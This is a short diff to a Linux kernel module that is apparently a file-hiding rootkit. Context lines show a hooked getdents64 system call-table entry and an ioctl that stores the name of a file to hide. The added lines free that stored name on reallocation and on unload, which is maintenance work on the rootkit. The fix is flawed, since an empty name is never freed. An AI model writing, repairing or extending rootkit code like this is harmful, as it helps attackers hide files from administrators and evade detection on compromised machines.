@@ -293,6 +293,8 @@ static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
 			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
                 return -EFAULT;
             printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
+			if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
+				kfree(HIDDEN_FILE);
 			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
 			memcpy(HIDDEN_FILE, file_info.name, file_info.len);
 			HIDDEN_FILE[file_info.len - 1] = '\0';
@@ -369,6 +371,9 @@ static void __exit lkm_exit(void)
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	
 	protect_memory();
+
+	if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
+		kfree(HIDDEN_FILE);
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
